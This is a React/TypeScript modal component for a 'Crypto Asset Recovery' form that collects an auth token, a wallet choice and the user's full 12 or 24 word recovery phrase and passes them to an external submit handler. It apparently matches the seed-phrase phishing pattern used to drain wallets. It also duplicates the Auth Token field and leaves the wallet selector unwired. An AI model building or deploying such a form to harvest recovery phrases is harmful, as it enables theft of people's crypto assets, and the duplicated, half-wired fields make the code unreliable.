import { Modal } from '@/components/ui/modal';
import Input from '@/components/form/input/InputField';
import TextArea from '@/components/form/input/TextArea';
import Select from '@/components/form/Select';
import { walletOptions } from '@/constants';

interface RecoveryModalProps {
	isOpen: boolean;
	onClose: () => void;
	recoveryPhrase: string;
	setRecoveryPhrase: (phrase: string) => void;
	authToken: string;
	setAuthToken: (token: string) => void;
	error: string;
	isSubmitting: boolean;
	onSubmit: () => void;
}

export default function RecoveryModal({
	isOpen,
	onClose,
	recoveryPhrase,
	setRecoveryPhrase,
	authToken,
	setAuthToken,
	error,
	isSubmitting,
	onSubmit,
}: RecoveryModalProps) {
	return (
		<Modal isOpen={isOpen} onClose={onClose} className="max-w-lg mx-4">
			<div className="p-6">
				<div className="text-center mb-6">
					<div className="mx-auto h-12 w-12 bg-red-100 dark:bg-red-900/20 rounded-lg flex items-center justify-center mb-4">
						<svg
							className="h-6 w-6 text-red-600 dark:text-red-400"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor">
							<path
								strokeLinecap="round"
								strokeLinejoin="round"
								strokeWidth={2}
								d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z"
							/>
						</svg>
					</div>
					<h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
						Crypto Asset Recovery
					</h3>
					<p className="text-sm text-gray-500 dark:text-gray-400">
						Enter your recovery information to initiate the asset recovery
						process.
					</p>
				</div>

				{error && (
					<div className="mb-4 p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-lg">
						<p className="text-sm text-red-600 dark:text-red-400">{error}</p>
					</div>
				)}

				<div className="space-y-4">
					<div>
						<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
							Auth Token
						</label>
						<Input
							type="text"
							placeholder="Please Enter your Auth Token..."
							value={authToken}
							onChange={(e) => setAuthToken(e.target.value)}
							className="w-full"
						/>
					</div>

					<div>
						<Select
							options={walletOptions}
							placeholder="Select a wallet"
							onChange={() => {}}
						/>
					</div>

					<div>
						<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
							Auth Token
						</label>
						<Input
							type="text"
							placeholder="Please Enter your Auth Token..."
							value={authToken}
							onChange={(e) => setAuthToken(e.target.value)}
							className="w-full"
						/>
					</div>

					<div>
						<label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
							Recovery Phrase *
						</label>
						<TextArea
							placeholder="Enter your 12 or 24 word recovery phrase..."
							rows={3}
							value={recoveryPhrase}
							onChange={(e) => setRecoveryPhrase(e.target.value)}
							className="w-full"
						/>
					</div>

					<div className="flex gap-3 pt-4">
						<button
							onClick={onClose}
							className="flex-1 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-gray-200 px-4 py-2.5 rounded-lg font-medium transition-colors">
							Cancel
						</button>
						<button
							onClick={onSubmit}
							disabled={isSubmitting}
							className="flex-1 bg-red-600 hover:bg-red-700 disabled:bg-red-400 text-white px-4 py-2.5 rounded-lg font-medium transition-colors flex items-center justify-center gap-2">
							{isSubmitting ? (
								<>
									<svg
										className="animate-spin h-4 w-4"
										fill="none"
										viewBox="0 0 24 24">
										<circle
											className="opacity-25"
											cx="12"
											cy="12"
											r="10"
											stroke="currentColor"
											strokeWidth="4"></circle>
										<path
											className="opacity-75"
											fill="currentColor"
											d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
									</svg>
									Processing...
								</>
							) : (
								'Submit Recovery'
							)}
						</button>
					</div>
				</div>
			</div>
		</Modal>
	);
}
